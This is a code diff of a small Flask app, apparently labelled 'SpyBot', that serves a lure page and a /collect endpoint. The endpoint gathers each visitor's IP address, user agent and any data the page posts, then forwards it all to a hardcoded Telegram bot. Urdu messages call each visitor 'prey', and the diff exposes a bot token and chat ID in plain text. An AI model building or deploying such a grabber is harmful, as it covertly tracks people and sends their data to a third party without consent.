@@ -1,31 +1,40 @@
-from flask import Flask, request
-import telebot
+from flask import Flask, request, render_template
+import requests
+import os
 
-TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
-bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-YOUR_TELEGRAM_ID = 6908281054
+# ====== Telegram Configuration ======
+BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
+CHAT_ID = "6908281054"  # ← یہاں اپنا اصل چیٹ آئی ڈی لگاؤ
 
-@app.route('/' + TOKEN, methods=['POST'])
-def getMessage():
-    json_str = request.get_data().decode('UTF-8')
-    update = telebot.types.Update.de_json(json_str)
-    bot.process_new_updates([update])
+# ====== HTML Route ======
+@app.route('/')
+def index():
+    return render_template("spy.html")
+
+# ====== Data Receiver Route ======
+@app.route('/collect', methods=['POST'])
+def collect():
+    data = request.json
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+
+    message = f"""
+👁️ شکار آیا!
+🌐 IP Address: {ip}
+📱 Device: {user_agent}
+🧠 Raw Data: {data}
+    """
+
+    # Telegram پر بھیجو
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {'chat_id': CHAT_ID, 'text': message}
+    requests.post(url, data=payload)
+
     return "OK", 200
 
-@app.route('/spy')
-def spy():
-    ip = request.remote_addr
-    msg = f"👁️ شکار آیا!\nIP Address: {ip}"
-    bot.send_message(YOUR_TELEGRAM_ID, msg)
-    return "📡 Spy data sent to Faizan!", 200
-
-@bot.message_handler(commands=['start'])
-def welcome(message):
-    bot.reply_to(message, "👋 Faizan™ SpyBot میں خوش آمدید!")
-
-if __name__ == "__main__":
-    import os
-    port = int(os.environ.get("PORT", 5000))
+# ====== Start App on Render ======
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
